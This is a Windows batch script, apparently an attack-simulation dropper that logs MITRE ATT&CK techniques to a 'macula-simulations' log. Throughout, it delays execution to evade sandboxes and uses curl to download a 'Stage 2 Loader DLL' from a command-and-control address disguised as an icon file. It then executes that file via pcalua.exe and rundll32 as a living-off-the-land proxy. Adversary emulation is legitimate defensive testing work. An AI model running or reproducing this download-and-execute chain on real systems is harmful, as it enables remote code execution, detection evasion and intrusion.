@echo off
setlocal enabledelayedexpansion

REM Random-named SET variable declarations for all PHR_* placeholders
SET gkqepz=%APPDATA%\10795\6532862c
SET htzbva=17ca725a.txt
SET wjflor=https://10.0.0.49/stage/2/icon.png?10795-7
SET vxqmud=BALAM-S2BO
SET asfpen=10795
SET rcxnwd=7
SET mytpbr=%PUBLIC%\\macula-simulations.log

REM Cache timestamp at script start
SET tsvar=!DATE!/!TIME!

REM Initial sandbox evasion delay (10-20s)
timeout /t 15 /nobreak >nul

REM Heartbeat fetch – download Stage 2 Loader DLL from C2
echo [!tsvar!][DEBUG][!vxqmud!][!asfpen!]: heartbeat_start>> "!mytpbr!" 2>nul
curl -k -s -o "!gkqepz!\!htzbva!" "!wjflor!"
echo [!tsvar!][DEBUG][!vxqmud!][!asfpen!]: heartbeat_complete>> "!mytpbr!" 2>nul

REM Delay between operations (ping method)
ping -n 6 127.0.0.1 >nul

REM Change working directory to output directory
echo [!tsvar!][DEBUG][!vxqmud!][!asfpen!]: chdir_start>> "!mytpbr!" 2>nul
cd /d "!gkqepz!" >nul 2>&1
if "%errorlevel%"=="0" (
    echo [!tsvar!][DEBUG][!vxqmud!][!asfpen!]: chdir_result=0>> "!mytpbr!" 2>nul
) else (
    echo [!tsvar!][DEBUG][!vxqmud!][!asfpen!]: chdir_result=1>> "!mytpbr!" 2>nul
)

REM Random delay (10-30s) via CHOICE
SET /A delay=%RANDOM% %% 20 + 10
CHOICE /C Y /N /D Y /T !delay! >nul

REM TTP Log: T1497|Virtualization/Sandbox Evasion
echo [!tsvar!][TTP][!vxqmud!][!asfpen!]: T1497|Virtualization/Sandbox Evasion=OK:>> "!mytpbr!" 2>nul

REM Delay before DLL load
timeout /t 8 /nobreak >nul

REM Invoke Stage 2 Loader DLL via pcalua -> rundll32 LOLBIN
echo [!tsvar!][DEBUG][!vxqmud!][!asfpen!]: rundll32_start>> "!mytpbr!" 2>nul
pcalua.exe -a C:\Windows\System32\rundll32.exe -c "!gkqepz!\!htzbva!,RunSimulation"
if "%errorlevel%"=="0" (
    echo [!tsvar!][DEBUG][!vxqmud!][!asfpen!]: rundll32_result=0>> "!mytpbr!" 2>nul
) else (
    echo [!tsvar!][DEBUG][!vxqmud!][!asfpen!]: rundll32_result=1>> "!mytpbr!" 2>nul
)

REM TTP Log: T1218|System Binary Proxy Execution
echo [!tsvar!][TTP][!vxqmud!][!asfpen!]: T1218|System Binary Proxy Execution=OK:>> "!mytpbr!" 2>nul

REM Final delay to avoid rapid exit
ping -n 4 127.0.0.1 >nul

endlocal